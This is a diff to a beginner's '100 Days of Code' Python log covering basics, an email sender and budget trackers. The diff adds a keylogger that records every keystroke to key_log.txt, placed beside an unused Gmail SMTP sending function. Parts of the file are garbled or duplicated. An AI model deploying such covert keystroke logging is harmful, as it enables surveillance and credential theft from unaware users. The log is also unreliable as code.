@@ -1,36 +1,37 @@
- # My100DaysOfCode
-DAY 1
+# My100DaysOfCode
+
+DAY 01
 ====================
 ### Day 1: Introduction to Python
-### Author: [ABDULLAHI AHMED OSMAN]
+### Author: ABDULLAHI AHMED OSman
 ### Date: 2025-01-01
 ### Description: This is the first day of my 100 days of code challenge. I will begin by introducing myself and explaining the purpose of this challenge.
-### Code: This is a simple Python script that prints out a message to the user.# My100DaysOfCode
+### Code: This is a simple Python script that prints out a message to the user.
 
-print("Hello, World!")
-print("Welcome to my 100 days of code challenge.")
-print("I'm ABDULLAHI ABDULLAHI, and I'm excited to start this journey.")
-print("Over the next 100 days, I'll be learning and coding every day.")
-print("I'll be sharing my progress and experiences along the way.")
-print("Thanks for joining me on this journey!")
+def introduction_to_python():
+    print("Hello, World!")
+    print("Welcome to my 100 days of code challenge.")
+    print("I'm ABDULLAHI ABDULLAHI, and I'm excited to start this journey.")
+    print("Over the next 100 days, I'll be learning and coding every day.")
+    print("I'll be sharing my progress and experiences along the way.")
+    print("Thanks for joining me on this journey!")
 
-DAY 2
+introduction_to_python()
+
+DAY 02
 ====================
 ### Day 2: Variables and Data Types
-### Author: ABDULLAHI AHMED OSMAN
+### Author: ABDULLAHI AHMED OSman
 ### Date: 2025-01-02
 ### Description: In this day, I will be learning about variables and data types in Python.
 ### Code: This is a simple Python script that demonstrates the use of variables and data types.
 
 def variables_and_data_types():
-    # Define variables with descriptive names
     full_name = "Abdullahi Ahmed Osman"
     current_age = 21
 
-    # Use f-string formatting for better readability
     print(f"My full name is {full_name} and I am {current_age} years old.")
 
-    # Demonstrate different data types
     print("Data Types in Python:")
     print("1. Integers:", type(current_age))
     print("2. Floats:", type(3.14))
@@ -41,7 +42,7 @@ def variables_and_data_types():
 
 variables_and_data_types()
 
-DAY 3
+DAY 03
 ====================
 ### Day 3: Basic Operators
 ### Author: ABDULLAHI AHMED OSMAN
@@ -50,32 +51,28 @@ DAY 3
 ### Code: This is a simple Python script that demonstrates the use of basic operators.
 
 def basic_operators():
-    # Define variables
     x = 10
     y = 5
 
-    # Demonstrate arithmetic operators
     print("Arithmetic Operators:")
     print(f"1. Addition: {x} + {y} = {x + y}")
     print(f"2. Subtraction: {x} - {y} = {x - y}")
     print(f"3. Multiplication: {x} * {y} = {x * y}")
     print(f"4. Division: {x} / {y} = {x / y}")
 
-    # Demonstrate comparison operators
     print("\nComparison Operators:")
     print(f"1. Equal to: {x} == {y} = {x == y}")
     print(f"2. Not equal to: {x} != {y} = {x != y}")
     print(f"3. Greater than: {x} > {y} = {x > y}")
     print(f"4. Less than: {x} < {y} = {x < y}")
 
-    # Demonstrate logical operators
     print("\nLogical Operators:")
     print(f"1. And: {x} > 5 and {x} < 15 = {x > 5 and x < 15}")
     print(f"2. Or: {x} > 5 or {x} < 5 = {x > 5 or x < 5}")
 
 basic_operators()
 
-DAY 4
+DAY 04
 ====================
 ### Day 4: Control Structures
 ### Author: ABDULLAHI AHMED OSMAN
@@ -84,11 +81,9 @@ DAY 4
 ### Code: This is a simple Python script that demonstrates the use of control structures.
 
 def control_structures():
-    # Define variables
     x = 10
     y = 5
 
-    # Demonstrate if-else statement
     if x > y:  
         print(f"{x} is greater than {y}")
     elif x == y:
@@ -96,19 +91,16 @@ def control_structures():
     else:
         print(f"{x} is less than {y}")
 
-    # Demonstrate for loop
     print("\nFor Loop:")
     for i in range(5):
         print(i)
 
-    # Demonstrate while loop
     print("\nWhile Loop:")
     i = 0
     while i < 5:
         print(i)
         i += 1
 
-    # Demonstrate nested if-else statement
     print("\nNested If-Else Statement:")
     if x > y:  
         if x > 10:
@@ -118,7 +110,6 @@ def control_structures():
     else:
         print(f"{x} is less than or equal to {y}")
 
-    # Demonstrate break and continue statements
     print("\nBreak and Continue Statements:")
     for i in range(5):
         if i == 3:
@@ -133,7 +124,7 @@ def control_structures():
 
 control_structures()
 
-DAY 5
+DAY 05
 ================
 ### Day 5: Functions
 ### Author: ABDULLAHI AHMED OSMAN
@@ -156,15 +147,17 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
- 
-DAY 6
+    # Output: Hello, Abdullahi! 15
+    functions()
+
+
+DAY 06
 ================
 ### Day 6: Modules
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-06
 ### Description: In this day, I will be learning about modules in Python.
 ### Code: This is a simple Python script that demonstrates the use of modules.
-
 import math
 import random
 import datetime
@@ -223,13 +216,12 @@ def modules_example():
 
 modules_example()
 
-DAY 7
+DAY 07
 ================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-07
 ### Description: This is the seventh day of the 100 Days of Code challenge.
 ### The task is to create a program that can play a simple game of Rock, Paper, Sc
-
 import random
 
 def game():
@@ -298,11 +290,6 @@ def main():
 if __name__ == "__main__":
     main()
 
-# Output:
-# Email: test@example.com, Valid: True
-# Email: test.example.com, Valid: False
-# Email: test@.com, Valid: False
-
 import keyboard
 import time
 import threading
@@ -338,7 +325,59 @@ def main():
 if __name__ == "__main__":
     main()
 
-DAY 9
+import os
+import platform
+import time
+import datetime
+import logging
+import threading
+import keyboard
+import re
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def send_email(subject, message, from_addr, to_addr, password):
+    msg = MIMEMultipart()
+    msg['From'] = from_addr
+    msg['To'] = to_addr
+    msg['Subject'] = subject
+    msg.attach(MIMEText(message, 'plain'))
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(from_addr, password)
+    text = msg.as_string()
+    server.sendmail(from_addr, to_addr, text)
+    server.quit()
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
+
+ DAY 9
 ===============================
 ### Author: ABDULLAHI AHMED OSMAN
 ### Date: 2025-01-09
@@ -387,243 +426,6 @@ def main():
         print("Email sent successfully!")
     except Exception as e:
         print(f"An error occurred: {e}")
-
-if __name__ == "__main__":
-    main()
-
-DAY 10
-===============================
-### Author: ABDULLAHI AHMED OSMAN
-### Date: 2025-01-10
-### Description: This is the ninth day of the 100 Days of Code challenge.
-### The task is to create a program that can send an email using the provided details.
-### The program should ask for user input for the subject, message, sender's email address, recipient
-'s email address, and sender's email password.
-### The program should then send an email using the provided details.
-
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-
-def send_email(subject, message, from_addr, to_addr, password):
-    """
-    Sends an email using the provided details.
-    
-    Args:
-        subject (str): The subject of the email.
-        message (str): The body of the email.
-        from_addr (str): The sender's email address.
-        to_addr (str): The recipient's email address.
-        password (str): The sender's email password.
-    """
-    msg = MIMEMultipart()
-    msg['From'] = from_addr
-    msg['To'] = to_addr
-    msg['Subject'] = subject
-    msg.attach(MIMEText(message, 'plain'))
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(from_addr, password)
-    text = msg.as_string()
-    server.sendmail(from_addr, to_addr, text)
-    server.quit()
-
-def main():
-    """
-    Asks for user input and sends an email using the provided details.
-    """
-    subject = input("Enter the subject of the email: ")
-    message = input("Enter the body of the email: ")
-    from_addr = input("Enter your email address: ")
-    to_addr = input("Enter the recipient's email address: ")
-    password = input("Enter your email password: ")
-    
-    try:
-        send_email(subject, message, from_addr, to_addr, password)
-        print("Email sent successfully!")
-    except Exception as e:
-        print(f"An error occurred: {e}")
-
-if __name__ == "__main__":
-    main()
-
-DAY 11
-===============================
-### Author: ABDULLAHI AHMED OSMAN
-### Date: 2025-01-11
-### Description: This is the eleventh day of the 100 Days of Code challenge.
-### The task is to create a program that allows to track our expenses and income. The program should be able to add, remove, and display expenses and income.
-### The program should also be able to calculate the total income and total expenses.
-python
-class ExpenseTracker:
-    def __init__(self):
-        self.expenses = {}
-        self.income = 0
-
-    def add_expense(self, name, amount):
-        if amount < 0:
-            print("Expense amount cannot be negative.")
-        else:
-            self.expenses[name] = amount
-
-    def remove_expense(self, name):
-        if name in self.expenses:
-            del self.expenses[name]
-        else:
-            print("Expense not found.")
-
-    def display_expenses(self):
-        if not self.expenses:
-            print("No expenses added.")
-        else:
-            for name, amount in self.expenses.items():
-                print(f"{name}: ${amount:.2f}")
-
-    def add_income(self, amount):
-        if amount < 0:
-            print("Income amount cannot be negative.")
-        else:
-            self.income += amount
-
-    def display_income(self):
-        print(f"Total income: ${self.income:.2f}")
-
-    def calculate_total_expenses(self):
-        return sum(self.expenses.values())
-
-    def display_balance(self):
-        total_expenses = self.calculate_total_expenses()
-        balance = self.income - total_expenses
-        print(f"Total expenses: ${total_expenses:.2f}")
-        print(f"Balance: ${balance:.2f}")
-
-def main():
-    tracker = ExpenseTracker()
-    while True:
-        print("\n1. Add expense")
-        print("2. Remove expense")
-        print("3. Display expenses")
-        print("4. Add income")
-        print("5. Display income")
-        print("6. Display balance")
-        print("7. Quit")
-        choice = input("Enter your choice: ")
-        if choice == "1":
-            tracker.add_expense(input("Enter expense name: "), float(input("Enter expense amount: ")))
-        elif choice == "2":
-            tracker.remove_expense(input("Enter expense name: "))
-        elif choice == "3":
-            tracker.display_expenses()
-        elif choice == "4":
-            tracker.add_income(float(input("Enter income amount: ")))
-        elif choice == "5":
-            tracker.display_income()
-        elif choice == "6":
-            tracker.display_balance()
-        elif choice == "7":
-            break
-        else:
-            print("Invalid choice. Please try again.")
-
-if __name__ == "__main__":
-    main()
-
- DAY 12
-==============================
-### Author: ABDULLAHI AHMED OSMAN
-### Date: 2025-01-12
-### Description: This is the twelfth day of the 100 Days of Code challenge.
-### The task is to create a program that allows to track power usage in a house.
-### The program should be able to add, remove, and display power usage for each device.
-### The program should also be able to calculate the total power usage and display it.
-### The program should be able to calculate the cost of the power usage based on the cost per unit
-### and display it.
-### The program should be able to display the total cost of the power usage for each device.
-### The program should be able to display the total cost of the power usage for all devices.
-
-class PowerUsageTracker:
-    def __init__(self):
-        self.devices = {}
-        self.cost_per_unit = 0
-
-    def add_device(self, name, power_usage):
-        if power_usage < 0:
-            print("Power usage cannot be negative.")
-        else:
-            self.devices[name] = power_usage
-
-    def remove_device(self, name):
-        if name in self.devices:
-            del self.devices[name]
-        else:
-            print("Device not found.")
-
-    def display_devices(self):
-        if not self.devices:
-            print("No devices added.")
-        else:
-            for name, power_usage in self.devices.items():
-                print(f"{name}: {power_usage} units")
-
-    def calculate_total_power_usage(self):
-        return sum(self.devices.values())
-
-    def display_total_power_usage(self):
-        total_power_usage = self.calculate_total_power_usage()
-        print(f"Total power usage: {total_power_usage} units")
-
-    def set_cost_per_unit(self, cost):
-        if cost < 0:
-            print("Cost per unit cannot be negative.")
-        else:
-            self.cost_per_unit = cost
-
-    def calculate_total_cost(self):
-        total_power_usage = self.calculate_total_power_usage()
-        return total_power_usage * self.cost_per_unit
-
-    def display_total_cost(self):
-        total_cost = self.calculate_total_cost()
-        print(f"Total cost: ${total_cost:.2f}")
-
-    def display_device_cost(self):
-        if not self.devices:
-            print("No devices added.")
-        else:
-            for name, power_usage in self.devices.items():
-                device_cost = power_usage * self.cost_per_unit
-                print(f"{name}: ${device_cost:.2f}")
-
-def main():
-    tracker = PowerUsageTracker()
-    while True:
-        print("\n1. Add device")
-        print("2. Remove device")
-        print("3. Display devices")
-        print("4. Calculate total power usage")
-        print("5. Set cost per unit")
-        print("6. Calculate total cost")
-        print("7. Display device cost")
-        print("8. Quit")
-        choice = input("Enter your choice: ")
-        if choice == "1":
-            tracker.add_device(input("Enter device name: "), float(input("Enter power usage: ")))
-        elif choice == "2":
-            tracker.remove_device(input("Enter device name: "))
-        elif choice == "3":
-            tracker.display_devices()
-        elif choice == "4":
-            tracker.display_total_power_usage()
-        elif choice == "5":
-            tracker.set_cost_per_unit(float(input("Enter cost per unit: ")))
-        elif choice == "6":
-            tracker.display_total_cost()
-        elif choice == "7":
-            tracker.display_device_cost()
-        elif choice == "8":
-            break
-        else:
-            print("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
     main()
